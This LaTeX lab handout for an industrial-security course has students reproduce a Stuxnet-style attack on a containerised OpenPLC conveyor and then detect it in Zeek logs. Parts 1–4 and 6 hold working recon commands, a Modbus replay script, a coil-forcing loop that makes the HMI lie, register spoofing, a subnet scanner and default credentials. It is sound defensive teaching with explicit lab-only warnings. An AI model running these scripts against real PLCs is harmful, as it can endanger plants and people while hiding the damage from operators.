@@ -1,0 +1,561 @@
+\documentclass[11pt,a4paper]{article}
+
+\def\courseTitle{Industrial Security (Bachelor)}
+\def\labNumber{05}
+\def\labTitle{Reproducing a Stuxnet-Shape on the Lab Plant}
+\def\labSection{05}
+\def\labTime{90--120 min}
+
+\input{../../../template/lab-preamble.tex}
+
+\begin{document}
+\labheader
+
+% --------------------------------------------------------------------
+\begin{goalbox}
+Stand in the attacker's shoes for one afternoon. You will scan the lab
+PLC, baseline its ``normal'', record and replay its own traffic, then
+write malicious values that drive the process out of its safe band
+while the HMI keeps reporting healthy numbers. Finally, you will turn
+around and find your own attack in Zeek's logs -- the way a real SOC
+analyst would. Every step here mirrors an incident from the
+threat-landscape lecture (Stuxnet, Industroyer, TRITON, CyberAv3ngers).
+\end{goalbox}
+
+\begin{warnbox}
+\textbf{Lab containers only.} The techniques below are deliberately
+offensive (unauthenticated Modbus writes, traffic replay, network
+scanning). You may execute them \emph{only} against the lab stack on
+the private \texttt{172.28.0.0/16} bridge network. Running any of
+them against equipment you do not own is, in most jurisdictions, a
+criminal offence under computer-misuse law and -- for OT in particular
+-- can also kill people. The lab plant cannot. Real plants can.
+\end{warnbox}
+
+% --------------------------------------------------------------------
+\section*{Background -- what this lab simulates}
+
+The lab stack runs a tiny conveyor controller as a ladder-logic
+program (\texttt{conveyor.st}) on the OpenPLC runtime. For IT-minded
+readers, the rough analogy is:
+
+\begin{itemize}\setlength{\itemsep}{1pt}
+  \item \textbf{The PLC} (OpenPLC at \texttt{172.28.0.10}, port 502)
+        is a tiny embedded server. Instead of HTTP it speaks
+        \textbf{Modbus TCP} -- an unauthenticated request/response
+        protocol from 1979. Think ``HTTP/1.0 with no TLS, no
+        cookies, no Host header, and no User-Agent''.
+  \item \textbf{Coils} (booleans) and \textbf{holding registers}
+        (16-bit words) are the PLC's memory. They are addressable
+        over the network the way a Redis key is addressable: anyone
+        who can reach port 502 can read \emph{and write} them.
+  \item \textbf{The ladder program} is the application logic. It runs
+        every 20\,ms in an infinite loop -- read inputs, compute,
+        write outputs. Think of it as a single-threaded event loop
+        with a guaranteed maximum jitter.
+  \item \textbf{The HMI} (Human--Machine Interface) is the operator's
+        web dashboard. It pulls live values from the PLC over Modbus.
+        For this lab, OpenPLC's built-in \emph{Monitoring} page
+        (\url{http://127.0.0.1:8080}) is your HMI.
+\end{itemize}
+
+The \emph{Stuxnet shape} we will reproduce, in miniature, has three
+moves:
+\begin{enumerate}\setlength{\itemsep}{1pt}
+  \item \textbf{Learn what normal looks like} (passive recon, then
+        polling for a baseline).
+  \item \textbf{Replay} a slice of legitimate traffic so the wire
+        looks normal while you act.
+  \item \textbf{Write to two places at once}: the variable that drives
+        the process and the variable the operator sees. The first
+        breaks the plant; the second hides it.
+\end{enumerate}
+
+Real-world anchor: at Natanz, Stuxnet recorded $\sim$21~seconds of
+normal centrifuge telemetry and played it back to the operator's
+WinCC HMI while the Fararo Paya / Vacon variable-frequency drives
+were being driven outside spec. The operator saw a healthy plant
+for the entire attack window (Falliere, Murchu, Chien,
+\emph{W32.Stuxnet Dossier} v1.4, Symantec, Feb 2011, p.~36).
+
+% --------------------------------------------------------------------
+\section*{Pre-flight}
+
+\begin{stepbox}{0 -- Bring the stack up}
+From the repository root:
+\begin{lstlisting}[language=bash]
+cd bachelor/labs/_stack
+docker compose up -d
+docker compose ps
+\end{lstlisting}
+You should see at least \texttt{is-openplc}, \texttt{is-zeek},
+\texttt{is-student}, \texttt{is-opcua}, \texttt{is-mqtt} in
+state \texttt{Up}. The \texttt{is-openplc-init} container is
+expected to be \texttt{Exited (0)} -- that one is a single-shot
+bootstrap that uploads \texttt{conveyor.st} and starts the PLC.
+
+Verify the conveyor program is actually running:
+\begin{lstlisting}[language=bash]
+docker compose exec student curl -s http://172.28.0.10:8080/login \
+  -o /dev/null -w "HTTP %{http_code}\n"
+\end{lstlisting}
+Expected: \texttt{HTTP 200}.
+\end{stepbox}
+
+% --------------------------------------------------------------------
+\section*{Part 1 -- Reconnaissance}
+
+\begin{stepbox}{1.1 -- Nmap the PLC}
+Open a shell in the student container and scan the PLC:
+\begin{lstlisting}[language=bash]
+docker compose exec student bash
+# inside the container:
+nmap -sV -p 1-10000 172.28.0.10
+\end{lstlisting}
+\textit{Expected output (abridged):}
+\begin{lstlisting}
+PORT     STATE SERVICE  VERSION
+502/tcp  open  modbus
+8080/tcp open  http     OpenPLC Web Server
+\end{lstlisting}
+Two findings worth noting:
+\begin{itemize}\setlength{\itemsep}{1pt}
+  \item Port 502 is the IANA-registered port for \textbf{Modbus TCP}.
+        Seeing it open from a generic scan is the same signal that
+        \texttt{port:502} gives on Shodan -- ``probably a PLC''.
+  \item Port 8080 is the engineering UI. In a real plant the
+        engineering port has a password (sometimes the factory
+        default \texttt{1111}; see CyberAv3ngers / Aliquippa
+        2023 -- CISA \emph{AA23-335A}, 1~Dec 2023). Try
+        \texttt{openplc / openplc} -- that is the upstream default.
+\end{itemize}
+\end{stepbox}
+
+\begin{stepbox}{1.2 -- Modbus banner fingerprint}
+Nmap also ships an NSE script that asks the PLC who it is:
+\begin{lstlisting}[language=bash]
+nmap -p 502 --script modbus-discover 172.28.0.10
+\end{lstlisting}
+\textit{Expected output (abridged):}
+\begin{lstlisting}
+502/tcp open  modbus
+| modbus-discover:
+|   sid 0x1:
+|     Slave ID data: ...OpenPLC...
+\end{lstlisting}
+\emph{IT analogue:} this is the OT-world equivalent of an HTTP
+\texttt{Server:} response header -- a free banner that tells an
+attacker exactly which firmware family to load exploits for.
+\end{stepbox}
+
+% --------------------------------------------------------------------
+\section*{Part 2 -- Baseline ``normal''}
+
+Before any attack, an attacker (and a defender) needs to know what
+the system looks like when nothing is wrong. This is the same
+reasoning that drives APM baselines in web ops: you can't say
+``latency spiked'' until you know what the median latency is.
+
+\begin{stepbox}{2.1 -- Read every register once}
+Inside the student container:
+\begin{lstlisting}[language=bash]
+python3 /labs/scripts/modbus_read.py
+\end{lstlisting}
+\textit{Expected output:}
+\begin{lstlisting}
+Registers 0..9: [0, 0, 0, 0, 0, 0, 0, 0, 0, 0]
+\end{lstlisting}
+The conveyor ladder does not use holding registers, so they all
+read zero. The interesting state lives in \emph{coils} (booleans).
+Read coils 0--7 directly:
+\begin{lstlisting}[language=bash]
+python3 - <<'PY'
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient("172.28.0.10", port=502); c.connect()
+print("coils 0..7  :", c.read_coils(0, count=8, slave=1).bits[:8])
+print("discrete 0.7:", c.read_discrete_inputs(0, count=8, slave=1).bits[:8])
+c.close()
+PY
+\end{lstlisting}
+\textit{Expected output (idle plant -- motor off, lamp off, stop and
+both guards engaged):}
+\begin{lstlisting}
+coils 0..7  : [False, False, ..., False, False]
+discrete 0.7: [False, True, True, True, False, False, False, False]
+\end{lstlisting}
+Mapping (from \texttt{conveyor.st}):
+\begin{itemize}\setlength{\itemsep}{1pt}
+  \item \texttt{\%IX0.0} Start button -- discrete input 0
+  \item \texttt{\%IX0.1} Stop button (normally closed) -- discrete input 1
+  \item \texttt{\%IX0.2}/\texttt{\%IX0.3} Guard1/Guard2 -- discrete inputs 2--3
+  \item \texttt{\%QX0.0} Motor output -- coil 0
+  \item \texttt{\%QX0.1} Lamp (operator-visible) -- coil 1
+\end{itemize}
+\end{stepbox}
+
+\begin{stepbox}{2.2 -- Sample the plant for 60 seconds}
+Run a steady poll so that (a) you have a baseline log and (b) Zeek
+sees a long stretch of legitimate traffic to contrast the attack
+with:
+\begin{lstlisting}[language=bash]
+docker compose exec -d student python3 /labs/scripts/modbus_poll_loop.py
+sleep 60
+docker compose exec student pkill -f modbus_poll_loop
+\end{lstlisting}
+This is the same poll a SCADA HMI would produce -- one request every
+two seconds, function code 3 (\textit{Read Holding Registers}).
+Defenders use exactly this kind of long-running poll to build the
+``known-good'' profile that detection rules then match against
+(see Lab 08).
+\end{stepbox}
+
+% --------------------------------------------------------------------
+\section*{Part 3 -- Record-and-replay attack}
+
+\begin{stepbox}{3.1 -- Capture 60 seconds of Modbus}
+Open a second shell into the student container and capture traffic
+on the PLC subnet while the poll loop from 2.2 runs:
+\begin{lstlisting}[language=bash]
+docker compose exec -d student tcpdump -i eth0 \
+  -w /labs/captures/lab05.pcap port 502
+docker compose exec -d student \
+  python3 /labs/scripts/modbus_poll_loop.py
+sleep 60
+docker compose exec student pkill -INT tcpdump
+docker compose exec student pkill -f modbus_poll_loop
+\end{lstlisting}
+The PCAP lands on the host at
+\texttt{bachelor/labs/\_stack/}\allowbreak\texttt{captures/lab05.pcap} thanks to the
+volume mount.
+
+Confirm you got real Modbus frames:
+\begin{lstlisting}[language=bash]
+tshark -r bachelor/labs/_stack/captures/lab05.pcap -Y modbus | head
+\end{lstlisting}
+\textit{Expected output (abridged):}
+\begin{lstlisting}
+172.28.0.20 -> 172.28.0.10  Modbus Query:    Func 3 (Read Holding)
+172.28.0.10 -> 172.28.0.20  Modbus Response: Func 3 (Read Holding)
+\end{lstlisting}
+\end{stepbox}
+
+\begin{stepbox}{3.2 -- Replay the capture from Python}
+The student container does not ship \texttt{tcpreplay} (and a raw
+L2 replay would not survive Docker's bridge anyway), so we replay
+at the \emph{application} layer: open a fresh TCP connection to
+the PLC and shove the Modbus PDUs back at it in order. This is
+what an attacker would do from a foothold inside the OT zone --
+no special privileges required.
+
+Save the following helper into the container and run it:
+\begin{lstlisting}[language=bash]
+docker compose exec student bash -c 'cat >/tmp/replay.py <<"PY"
+import socket, sys, time
+from scapy.all import rdpcap, Raw, TCP
+pkts = rdpcap("/labs/captures/lab05.pcap")
+mbap_pdus = []
+for p in pkts:
+    if TCP in p and Raw in p and p[TCP].dport == 502:
+        mbap_pdus.append(bytes(p[Raw].load))
+print(f"replaying {len(mbap_pdus)} Modbus PDUs")
+s = socket.create_connection(("172.28.0.10", 502), timeout=2)
+for i, pdu in enumerate(mbap_pdus):
+    s.sendall(pdu)
+    try:
+        s.recv(4096)
+    except socket.timeout:
+        pass
+    if i % 10 == 0:
+        print(f"  sent {i+1}/{len(mbap_pdus)}")
+    time.sleep(0.05)
+s.close()
+print("done")
+PY
+pip3 install --break-system-packages --quiet scapy \
+    >/dev/null 2>&1 || true
+python3 /tmp/replay.py'
+\end{lstlisting}
+\textit{Expected output (abridged):}
+\begin{lstlisting}
+replaying 30 Modbus PDUs
+  sent 1/30
+  sent 11/30
+  sent 21/30
+done
+\end{lstlisting}
+Open the HMI at \url{http://127.0.0.1:8080} and watch the Monitoring
+page. The replay produces \emph{exactly} the request pattern of a
+normal poll -- because that is what it is. Nothing the wire shows is
+``malicious'' on its own.
+
+\emph{Real-world anchor:} this is the same trick Stuxnet used for
+its 21-second HMI deception window. The malware did not invent
+sensor readings; it played back ones it had previously recorded.
+The packets were genuine. Only the \emph{timing} was a lie.
+\end{stepbox}
+
+% --------------------------------------------------------------------
+\section*{Part 4 -- Set-point spoofing with operator deception}
+
+The replay above proves that an attacker can produce
+indistinguishable-from-normal traffic. Now we use that cover to do
+something that actually moves the plant.
+
+\begin{stepbox}{4.1 -- Drive the motor while the operator HMI lies}
+The conveyor ladder is \texttt{Motor := (Start OR Motor) AND Stop
+AND Guard1 AND Guard2; Lamp := Motor;}. In a clean plant, the lamp
+follows the motor -- the operator sees the lamp on \emph{iff} the
+motor is on. We will break that invariant by writing both coils
+from the outside.
+
+Why this matters in plain IT terms: the ladder runs every 20\,ms
+and updates \texttt{Motor} from inputs, then \texttt{Lamp} from
+\texttt{Motor}. A Modbus write directly to coil~1 (Lamp) is
+overwritten on the next scan -- so a single write would be
+visible only for $<20$\,ms. But if we hold a steady stream of
+writes, we can pin the Lamp to a value of our choosing for as
+long as we like, while the actual Motor coil tells the truth on
+the I/O bus.
+
+Run the spoofing loop:
+\begin{lstlisting}[language=bash]
+docker compose exec student bash -c 'cat >/tmp/spoof.py <<"PY"
+import time
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient("172.28.0.10", port=502); c.connect()
+# 1) Trigger the dangerous condition: pulse the Start input via coil
+#    forcing on QX0.0 directly (override the ladder output).
+# 2) Simultaneously hold Lamp (coil 1) to FALSE so the operator
+#    HMI keeps showing "stopped".
+t_end = time.time() + 30
+n = 0
+while time.time() < t_end:
+    c.write_coil(address=0, value=True,  slave=1)   # Motor ON
+    c.write_coil(address=1, value=False, slave=1)   # Lamp OFF (lie)
+    n += 1
+    time.sleep(0.05)
+c.close()
+print(f"wrote {n} pairs in 30 s")
+PY
+python3 /tmp/spoof.py'
+\end{lstlisting}
+While that runs (30~seconds), refresh the OpenPLC
+\emph{Monitoring} page at \url{http://127.0.0.1:8080}. Watch the
+\texttt{Motor (\%QX0.0)} and \texttt{Lamp (\%QX0.1)} values. With a
+fast-enough write loop, you should see them disagree for stretches
+of time -- the motor reports ON, the lamp reports OFF, even though
+the ladder source code says they must be equal.
+
+\textit{Expected output:}
+\begin{lstlisting}
+wrote 600 pairs in 30 s
+\end{lstlisting}
+\emph{Real-world anchor:} this is the small Industroyer move
+(2016, Pivnichna substation). The Industroyer IEC-101/104 modules
+sent legitimate-looking control commands; from the protocol's
+point of view nothing was wrong. The damage was in \emph{what} the
+commands asked for, not in \emph{how} they were framed.
+\end{stepbox}
+
+\begin{stepbox}{4.2 -- A safer setpoint analogue}
+In a plant with an analogue setpoint (motor RPM, valve position,
+furnace temperature) the attacker writes the \emph{target} value
+into one holding register and the \emph{displayed} value into
+another. The operator dashboard reads only the displayed register.
+
+OpenPLC exposes holding registers 0--1023; the conveyor ladder
+does not use them. Use this as a thought experiment: write 9000
+(``RPM target far above safe band'') into register~0 and 1500
+(``healthy RPM'') into register~1, then ask yourself which one the
+HMI in front of you would have plotted.
+\begin{lstlisting}[language=bash]
+python3 - <<'PY'
+from pymodbus.client import ModbusTcpClient
+c = ModbusTcpClient("172.28.0.10", port=502); c.connect()
+c.write_register(address=0, value=9000, slave=1)   # "target"
+c.write_register(address=1, value=1500, slave=1)   # "displayed"
+print(c.read_holding_registers(0, count=2, slave=1).registers)
+c.close()
+PY
+\end{lstlisting}
+\textit{Expected output:}
+\begin{lstlisting}
+[9000, 1500]
+\end{lstlisting}
+\end{stepbox}
+
+% --------------------------------------------------------------------
+\section*{Part 5 -- Detection: find your own attack in Zeek}
+
+The Zeek service in this stack shares OpenPLC's network namespace
+(see \texttt{docker-compose.yml}), so it sees every packet
+in and out of the PLC -- which is exactly the position a SOC's
+network sensor would occupy if it were tapped onto the OT switch.
+
+\begin{stepbox}{5.1 -- List what Zeek captured}
+On the host (not in the student container):
+\begin{lstlisting}[language=bash]
+ls bachelor/labs/_stack/zeek-logs/
+\end{lstlisting}
+\textit{Expected output (relevant files):}
+\begin{lstlisting}
+conn.log
+modbus.log
+notice.log
+\end{lstlisting}
+\begin{itemize}\setlength{\itemsep}{1pt}
+  \item \texttt{conn.log} -- one line per TCP/UDP flow, protocol-agnostic.
+  \item \texttt{modbus.log} -- one line per Modbus request/response pair,
+        with the function code resolved.
+  \item \texttt{notice.log} -- one line per high-signal event. The
+        rule in \texttt{zeek/local.zeek} raises a notice on every
+        Modbus \emph{write} (function codes 5, 6, 15, 16).
+\end{itemize}
+\end{stepbox}
+
+\begin{stepbox}{5.2 -- Pinpoint the malicious writes}
+Modbus reads are function code 3; writes are function codes 5, 6,
+15 or 16. Pull only the writes from the spoofing window:
+\begin{lstlisting}[language=bash]
+jq -c 'select(.func | test("WRITE"))' \
+   bachelor/labs/_stack/zeek-logs/modbus.log | head
+\end{lstlisting}
+\textit{Expected output (abridged):}
+\begin{lstlisting}
+{"ts":...,"id.orig_h":"172.28.0.20","id.resp_h":"172.28.0.10",
+ "unit_id":1,"func":"WRITE_SINGLE_COIL","exception":null}
+{"ts":...,"id.orig_h":"172.28.0.20","id.resp_h":"172.28.0.10",
+ "unit_id":1,"func":"WRITE_SINGLE_COIL","exception":null}
+\end{lstlisting}
+And the notice:
+\begin{lstlisting}[language=bash]
+tail bachelor/labs/_stack/zeek-logs/notice.log
+\end{lstlisting}
+\textit{Expected output (abridged):}
+\begin{lstlisting}
+{"note":"ModbusWatch::Unsolicited_Write",
+ "msg":"Modbus write from 172.28.0.20 to 172.28.0.10 (FC=5)", ... }
+\end{lstlisting}
+Convert the Unix epoch in the \texttt{ts} field to a human
+timestamp:
+\begin{lstlisting}[language=bash]
+jq -r '.ts' bachelor/labs/_stack/zeek-logs/notice.log | head -1 \
+  | xargs -I{} date -d @{} '+%H:%M:%S'
+\end{lstlisting}
+This is the timestamp you would hand to the on-call analyst.
+\end{stepbox}
+
+\begin{stepbox}{5.3 -- Was the \emph{replay} from Part~3 detected?}
+Re-examine \texttt{modbus.log} \emph{without} the
+\texttt{WRITE} filter. The replay traffic is plain
+\texttt{READ\_HOLDING\_REGISTERS} -- function code 3 -- so it slips
+past the write-only notice rule completely. To catch the replay
+you would need a behaviour rule, not a protocol rule: ``the same
+client opens a fresh TCP session and sends the exact same
+sequence of transaction IDs we saw an hour ago.''
+
+\emph{Real-world anchor:} this is the exact gap that lets
+Volt Typhoon's living-off-the-land operators stay invisible for
+years -- nothing they do violates a protocol-level signature;
+detection has to be behavioural (CISA \emph{AA24-038A},
+7~Feb 2024).
+\end{stepbox}
+
+% --------------------------------------------------------------------
+\section*{Part 6 -- Stretch: Conpot-style scanner}
+
+\begin{stepbox}{6.1 -- Optional: write a mini-Shodan}
+For groups that finish early. Build a one-file scanner that walks
+the \texttt{172.28.0.0/24} subnet, finds anything listening on
+port~502, asks each device for its Modbus identification, and
+prints a report. This is, in miniature, what Shodan does
+continuously against the whole IPv4 Internet.
+\begin{lstlisting}[language=bash]
+docker compose exec student bash -c 'cat >/tmp/mini_shodan.py <<"PY"
+import ipaddress, socket
+from pymodbus.client import ModbusTcpClient
+from pymodbus.mei_message import ReadDeviceInformationRequest
+SUBNET = "172.28.0.0/24"
+for ip in ipaddress.ip_network(SUBNET).hosts():
+    ip = str(ip)
+    s = socket.socket(); s.settimeout(0.2)
+    try:
+        s.connect((ip, 502))
+    except Exception:
+        continue
+    finally:
+        s.close()
+    c = ModbusTcpClient(ip, port=502, timeout=1); c.connect()
+    rr = c.execute(ReadDeviceInformationRequest(unit=1))
+    vendor = product = rev = "?"
+    if not rr.isError():
+        info = getattr(rr, "information", {}) or {}
+        vendor  = (info.get(0) or b"?").decode(errors="replace")
+        product = (info.get(1) or b"?").decode(errors="replace")
+        rev     = (info.get(2) or b"?").decode(errors="replace")
+    print(f"{ip:15s}  502/tcp open  modbus  "
+          f"vendor={vendor!r} product={product!r} rev={rev!r}")
+    c.close()
+PY
+python3 /tmp/mini_shodan.py'
+\end{lstlisting}
+\textit{Expected output (one line, give or take):}
+\begin{lstlisting}
+172.28.0.10  502/tcp open  modbus
+   vendor='Unknown' product='OpenPLC' rev='1.0'
+\end{lstlisting}
+\emph{Real-world anchor:} Conpot is a low-interaction ICS
+honeypot; Shodan indexes results that look like this from the
+public Internet. CyberAv3ngers (2023) is the canonical example
+of a low-skill actor weaponising exactly this output -- scan
+\texttt{port:20256}, log in with \texttt{1111}, deface the HMI.
+\end{stepbox}
+
+% --------------------------------------------------------------------
+\section*{Bring the stack down}
+
+\begin{stepbox}{Cleanup}
+\begin{lstlisting}[language=bash]
+cd bachelor/labs/_stack
+docker compose down -v
+\end{lstlisting}
+\texttt{-v} removes the named volumes so the next lab starts from a
+clean slate.
+\end{stepbox}
+
+% --------------------------------------------------------------------
+\begin{deliverbox}
+Hand in a single PDF / markdown file containing:
+\begin{enumerate}\setlength{\itemsep}{1pt}
+  \item The nmap output from Step~1.1 with the open ports highlighted.
+  \item The baseline coil/register read from Step~2.1.
+  \item The first 10 lines of \texttt{modbus.log} during the replay
+        (Part~3) -- annotate the function code.
+  \item One screenshot of the OpenPLC \emph{Monitoring} page during
+        the spoofing run (Step~4.1) showing the
+        Motor/Lamp disagreement (or, if you missed the window, a
+        short explanation of why timing matters and how a real HMI
+        polling at 1\,Hz would have shown the lie).
+  \item The \texttt{notice.log} excerpt from Step~5.2 with the
+        human-readable timestamp of the first malicious write.
+  \item A 5-line answer to: \emph{Which of the three Stuxnet shapes
+        (replay, set-point spoofing, write-while-display-lies) would
+        a protocol-only IDS like the one in
+        \texttt{zeek/local.zeek} miss? What would you add?}
+  \item (Stretch, optional) The output of your mini-Shodan scanner.
+\end{enumerate}
+\end{deliverbox}
+
+% --------------------------------------------------------------------
+\begin{warnbox}
+\textbf{Authorisation reminder.} Every command in this lab is legal
+because the target is a container you started, on a private bridge
+network on your own host. The instant the destination changes --
+even to a friend's PLC, even with permission given verbally --
+you need written authorisation and a scoped engagement. For OT in
+particular, also make sure a process engineer is in the loop:
+\emph{Modbus has no rollback.} A write commits the moment the PLC
+acknowledges it.
+\end{warnbox}
+
+\end{document}
